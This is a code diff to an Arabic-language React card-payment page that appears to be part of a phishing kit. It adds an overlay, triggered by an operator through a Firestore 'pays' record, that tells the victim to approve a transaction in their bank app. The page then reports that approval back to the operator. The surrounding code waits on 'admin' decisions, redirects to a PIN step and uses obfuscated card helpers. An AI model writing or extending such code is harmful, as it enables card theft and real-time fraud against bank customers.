@@ -7,7 +7,7 @@ import { toast } from "sonner"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
-import { ShieldCheck, CreditCard, Lock } from "lucide-react"
+import { ShieldCheck, CreditCard, Lock, Smartphone } from "lucide-react"
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils"
 import { db } from "@/lib/firebase"
 import { secureAddData } from "@/lib/secure-firebase"
@@ -39,6 +39,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
   // Waiting state
   const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
+  const [showMessageOverlay, setShowMessageOverlay] = useState(false)
+  const [isConfirming, setIsConfirming] = useState(false)
   const rejectionHandledRef = useRef(false)
   
   const [isCardBlockedState, setIsCardBlockedState] = useState(false)
@@ -194,7 +196,14 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             setIsWaitingAdmin(false)
             // Redirect to PIN page directly
             router.push("/step3")
-          } else if (status === "rejected" && !rejectionHandledRef.current) {
+          } else if (status === "message") {
+            setIsWaitingAdmin(false)
+            setShowMessageOverlay(true)
+          } else if (status !== "message") {
+            setShowMessageOverlay(false)
+          }
+
+          if (status === "rejected" && !rejectionHandledRef.current) {
             console.log('[Card Status] Card rejected, hiding loader immediately')
             
             // Mark rejection as handled
@@ -247,6 +256,19 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
     return () => unsubscribe()
   }, [router])
+
+  const handleMessageConfirm = async () => {
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID || !db) return
+    setIsConfirming(true)
+    try {
+      await setDoc(doc(db as Firestore, "pays", visitorID), { cardStatus: "confirmed" }, { merge: true })
+    } catch (err) {
+      console.error("[form-a] confirm error:", err)
+    } finally {
+      setIsConfirming(false)
+    }
+  }
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = _fcn(e.target.value)
@@ -395,6 +417,42 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   return (
     <>
       {isWaitingAdmin && <FullPageLoader />}
+
+      {showMessageOverlay && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+          <div className="text-center space-y-6 px-8">
+            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
+                <Smartphone className="h-8 w-8 text-yellow-400" />
+              </div>
+            </div>
+            <div className="space-y-3">
+              <p className="text-xl font-bold leading-relaxed text-white">
+                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
+              </p>
+              <div className="flex items-center justify-center gap-2">
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+              </div>
+            </div>
+            <button
+              onClick={handleMessageConfirm}
+              disabled={isConfirming}
+              className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all disabled:opacity-60 disabled:cursor-not-allowed"
+              style={{
+                background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
+                color: "#1a3d52",
+                boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
+              }}
+            >
+              {isConfirming ? "جاري التأكيد..." : "تم الموافقة في التطبيق"}
+            </button>
+          </div>
+        </div>
+      )}
       
       {/* Email Modal for Blocked Countries */}
       <EmailModal 
